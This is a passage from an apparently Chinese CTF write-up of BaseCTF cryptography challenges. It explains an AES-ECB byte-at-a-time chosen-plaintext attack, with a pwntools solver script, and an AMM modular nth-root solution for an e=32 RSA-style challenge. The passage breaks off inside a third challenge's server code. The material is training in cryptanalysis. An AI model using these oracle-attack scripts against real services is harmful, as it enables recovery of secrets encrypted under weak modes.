class="hljs-string">b&#x27;:&#x27;</span>)<br>            cin=<span class="hljs-variable language_">self</span>.recv()<br>            final=cin+flag<br>            <span class="hljs-variable language_">self</span>.send(base64.b64encode(my_aes.encrypt(pad(final,AES.block_size))))<br><br>            <br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nConnection has been closed  =.=  &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.request.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span><br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br><br></code></pre></td></tr></table></figure><blockquote><p>灵感来源之前国外的一场，也没有给源码，甚至没有提示。</p><p>后面在cryptohack上也遇到了，就拿来出了一题。</p></blockquote><p>这题我们可以在原始内容前面加上 任意内容。</p><p>通过测试AES加密的密文，我们可以知道flag的长度。</p><blockquote><p>之后有两种方法，exp里都有写，但是从后往前爆破flag的也个点我没搞懂就先不讲了，只讲从前往后的。</p></blockquote><p>先讲利用原理：ECB模式中，算法对每一个分组进行加密，与前后分组无关，当密钥固定之后，只要这一个分组的明文相同，那么加密之后的密文也相同。</p><p>这里直接举个例子。</p><p>比如flag是BaseCTF{0123456789}，长度为19.一开始服务器给我们发送密文（base64解密之后）为32字节，为两个AES-ECB分组。我们给服务器依次发送1-16字节的数据，发送一个1字节时，服务器加密20字节，最后密文还是32字节；当发送14字节时，服务器加密33字节，最后密文为48字节，发生了变化，在这时，我们就可以计算出flag长度为32-(14-1)=19。</p><p>之后利用刚刚讲的原理，我们发送flag长度填充到一个AES-ECB分组长度减一的内容，比如这里我们发送31字节的a，这时候服务器加密：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi mathvariant="normal">∣</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>B</mi><mi mathvariant="normal">∣</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>T</mi><mi>F</mi><mo stretchy="false">{</mo><mn>0123456789</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">aaaaaaaaaaaaaaaa|aaaaaaaaaaaaaaB|aseCTF\{0123456789\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord">∣</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">{</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">9</span><span class="mclose">}</span></span></span></span></p><p>之后我们爆破flag的第一个字节，少发送一个字节，这时候服务器加密：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi mathvariant="normal">∣</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mo stretchy="false">?</mo><mi mathvariant="normal">∣</mi><mi>B</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>T</mi><mi>F</mi><mo stretchy="false">{</mo><mn>0123456789</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">aaaaaaaaaaaaaaaa|aaaaaaaaaaaaaaa?|BaseCTF\{0123456789\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mclose">?</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">{</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">9</span><span class="mclose">}</span></span></span></span></p><p>当我们爆破到这个字节为B时，服务器加密的第二个分组跟我们第一次发送的第二个分组相同，产生的密文也就相同，那么就可以推断出爆破成功，之后发送数据就要连带上爆破出来的flag。</p><p>这里在举爆破一个分组长度后的例子：</p><p>此时我们需要爆破flag的第17字节，我们已知flag的前16字节，我们发送(31-16)=15字节的a，得到：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>B</mi><mi mathvariant="normal">∣</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>T</mi><mi>F</mi><mo stretchy="false">{</mo><mn>012345678</mn><mi mathvariant="normal">∣</mi><mn>9</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">aaaaaaaaaaaaaaaB|aseCTF\{012345678|9\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord">∣</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">{</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">∣</span><span class="mord">9</span><span class="mclose">}</span></span></span></span></p><p>之后爆破第17位，此时发送数据需要带上flag，这是我们发送的数据aaaaaaaaaaaaaaaB|aseCTF{01234567?，最后得到：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>a</mi><mi>B</mi><mi mathvariant="normal">∣</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>T</mi><mi>F</mi><mo stretchy="false">{</mo><mn>01234567</mn><mo stretchy="false">?</mo><mi mathvariant="normal">∣</mi><mi>B</mi><mi>a</mi><mi>s</mi><mi>e</mi><mi>C</mi><mi>T</mi><mi>F</mi><mo stretchy="false">{</mo><mn>0123456789</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">aaaaaaaaaaaaaaaaB|aseCTF\{01234567?|BaseCTF\{0123456789\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord">∣</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">{</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mclose">?</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">{</span><span class="mord">0</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">9</span><span class="mclose">}</span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br>p=remote()<br><br><span class="hljs-built_in">print</span>(p.recvline())<br><span class="hljs-built_in">print</span>(p.recvline())<br><br>c=p.recvline()[:-<span class="hljs-number">1</span>]<br>c=base64.b64decode(c)<br><br>length1=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    p.recvline()    <span class="hljs-comment"># b&quot;:\n&quot;</span><br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*i<br>    p.sendline(payload)<br>    d=p.recvline()[:-<span class="hljs-number">1</span>]<br>    d=base64.b64decode(d)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(d)!=<span class="hljs-built_in">len</span>(c):<br>        length1=i<br>        <span class="hljs-keyword">break</span><br>length_flag=<span class="hljs-built_in">len</span>(c)-length1<br><span class="hljs-built_in">print</span>(length_flag)<br><br><span class="hljs-comment"># 从前往后爆破flag</span><br>payload_length=<span class="hljs-built_in">len</span>(c)+<span class="hljs-number">16</span>     <span class="hljs-comment"># 多一个分组保容错</span><br>flag=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(payload_length-<span class="hljs-number">1</span>,payload_length-<span class="hljs-number">1</span>-length_flag,-<span class="hljs-number">1</span>):<br>    p.recvline()    <span class="hljs-comment"># b&quot;:\n&quot;</span><br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*i<br>    p.sendline(payload)<br>    d=p.recvline()[:-<span class="hljs-number">1</span>]<br>    d=base64.b64decode(d)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">128</span>):<br>        p.recvline()    <span class="hljs-comment"># b&quot;:\n&quot;</span><br>        payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*i+flag+<span class="hljs-built_in">chr</span>(j).encode()<br>        p.sendline(payload1)<br>        e=p.recvline()[:-<span class="hljs-number">1</span>]<br>        e=base64.b64decode(e)<br>        e=e[payload_length-<span class="hljs-number">16</span>:payload_length]<br>        <span class="hljs-keyword">if</span> e <span class="hljs-keyword">in</span> d:<br>            flag+=<span class="hljs-built_in">chr</span>(j).encode()<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-string">&quot;&quot;&quot;# 从后往前爆破flag(此方法需要知道填充模式)</span><br><span class="hljs-string">from Crypto.Util.Padding import pad</span><br><span class="hljs-string">from Crypto.Cipher import AES</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 在前面填充到满足AES加密的分组长度</span><br><span class="hljs-string">dic=&#x27;&#123;&#125;-BCTF0123456789abcdef&#x27;</span><br><span class="hljs-string">flag=b&#x27;&#x27;</span><br><span class="hljs-string">for i in range(length_flag):</span><br><span class="hljs-string">    p.recvline()    # b&quot;:\n&quot;</span><br><span class="hljs-string">    server_payload=b&#x27;a&#x27;*(length1+i+1)</span><br><span class="hljs-string">    p.sendline(server_payload)</span><br><span class="hljs-string">    server_flag=p.recvline()[:-1]</span><br><span class="hljs-string">    server_flag=base64.b64decode(server_flag)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    for j in dic:</span><br><span class="hljs-string">        p.recvline()    # b&quot;:\n&quot;</span><br><span class="hljs-string">        my_payload=j.encode()+flag</span><br><span class="hljs-string">        my_payload=pad(my_payload,AES.block_size)</span><br><span class="hljs-string">        my_payload=my_payload+b&#x27;a&#x27;  # 我也不知道这里为什么要多加一个字节,当i=2时不加这个字节就会出错</span><br><span class="hljs-string">        p.sendline(my_payload)</span><br><span class="hljs-string">        my_flag=p.recvline()[:-1]</span><br><span class="hljs-string">        my_flag=base64.b64decode(my_flag)</span><br><span class="hljs-string">        my_flag=my_flag[:16]</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        if my_flag in server_flag:</span><br><span class="hljs-string">            flag=j.encode()+flag</span><br><span class="hljs-string">            </span><br><span class="hljs-string">            break</span><br><span class="hljs-string">    print(flag)&quot;&quot;&quot;</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="の歪来"><a class="markdownIt-Anchor" href="#の歪来"></a> の歪来</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>flag=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)==<span class="hljs-number">28</span><br>m=bytes_to_long(flag)<br><br>n=getPrime(<span class="hljs-number">2048</span>)<br>e=<span class="hljs-number">32</span><br><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><br></code></pre></td></tr></table></figure><p>AMM开根</p><p>论文在这里：<a href="https://arxiv.org/pdf/1111.4877">1111.4877 (arxiv.org)</a></p><blockquote><p>我还没搞懂，所以直接套用了板子。</p><p>我出这题只是想着AMM的常规板子是两个素数求解然后求CRT，我就改成了一个素数，然后小m可以直接得到。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> math<br><br><br>p = <span class="hljs-number">17363249226879909675667629533972233798566313669420563155296918020175446973456428454735263489044575257132690882883587342817653451483222705760704890265900885255972067349104579938808591608382992680533327518070878297438339884996059309549300942570104747348751766711833983705979880714174709047335147739991850385244159235504375559144283494800573079055547597410783559965162216203307100248001158445665271438067670522510991047688414176659907164436539491205637933681658814267567385232097679554282863595183422504494357205180093828786415060565003183966959273253039416986816444073158723191290806413175478175738266995214965220231649</span><br>e = <span class="hljs-number">32</span><br>c = <span class="hljs-number">6840453756562205147103219479843999687625029691496635689045074720240615321966887831642035124198445485320265097191334720798522097422084141332044111764558336174743819347952914775206809737198058220362381349481027893609144697054465070779290329222696236671374412706789862193871687821041053566873553189148668599841084370137084893575567622972476409755187388121177923217208552049876944055745912987536390075417261016809335539362984984190264791744790640858201038207982043569204062714722892105134794280417020318408200038144689432974312283915592134911446185412636709207566063730723406969727969141426530341540330398465744403597273</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">onemod</span>(<span class="hljs-params">e, q</span>):<br>    p = random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span>(powmod(p, (q-<span class="hljs-number">1</span>)//e, q) == <span class="hljs-number">1</span>):  <span class="hljs-comment"># (r,s)=1</span><br>        p = random.randint(<span class="hljs-number">1</span>, q)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AMM_rth</span>(<span class="hljs-params">o, r, q</span>):  <span class="hljs-comment"># r|(q-1</span><br>    <span class="hljs-keyword">assert</span>((q-<span class="hljs-number">1</span>) % r == <span class="hljs-number">0</span>)<br>    p = onemod(r, q)<br><br>    t = <span class="hljs-number">0</span><br>    s = q-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(s % r == <span class="hljs-number">0</span>):<br>        s = s//r<br>        t += <span class="hljs-number">1</span><br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>((s*k+<span class="hljs-number">1</span>) % r != <span class="hljs-number">0</span>):<br>        k += <span class="hljs-number">1</span><br>    alp = (s*k+<span class="hljs-number">1</span>)//r<br><br>    a = powmod(p, r**(t-<span class="hljs-number">1</span>)*s, q)<br>    b = powmod(o, r*a-<span class="hljs-number">1</span>, q)<br>    c = powmod(p, s, q)<br>    h = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t-<span class="hljs-number">1</span>):<br>        d = powmod(<span class="hljs-built_in">int</span>(b), r**(t-<span class="hljs-number">1</span>-i), q)<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br>            j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            j = (-math.log(d, a)) % r<br>        b = (b*(c**(r*j))) % q<br>        h = (h*c**j) % q<br>        c = (c*r) % q<br>    result = (powmod(o, alp, q)*h)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_Solution</span>(<span class="hljs-params">m, q, rt, cq, e</span>):<br>    mp = []<br>    <span class="hljs-keyword">for</span> pr <span class="hljs-keyword">in</span> rt:<br>        r = (pr*m) % q<br>        <span class="hljs-comment"># assert(pow(r, e, q) == cq)</span><br>        mp.append(r)<br>    <span class="hljs-keyword">return</span> mp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_ROOT2</span>(<span class="hljs-params">r, q</span>):  <span class="hljs-comment"># use function set() and .add() ensure that the generated elements are not repeated</span><br>    li = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(li) &lt; r):<br>        p = powmod(random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>), (q-<span class="hljs-number">1</span>)//r, q)<br>        li.add(p)<br>    <span class="hljs-keyword">return</span> li<br><br>cp = c % p<br><br>mp = AMM_rth(cp, e, p)<br><br>rt1 = ALL_ROOT2(e, p) <br>amp = ALL_Solution(mp, p, rt1, cp, e)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> amp:<br>    m=long_to_bytes(i)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;BaseCTF&#x27;</span> <span class="hljs-keyword">in</span> m:<br>        <span class="hljs-built_in">print</span>(m)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><h3 id="老涩批了"><a class="markdownIt-Anchor" href="#老涩批了"></a> 老涩批了</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> uuid <br>flag = os.getenv(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>).encode()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span 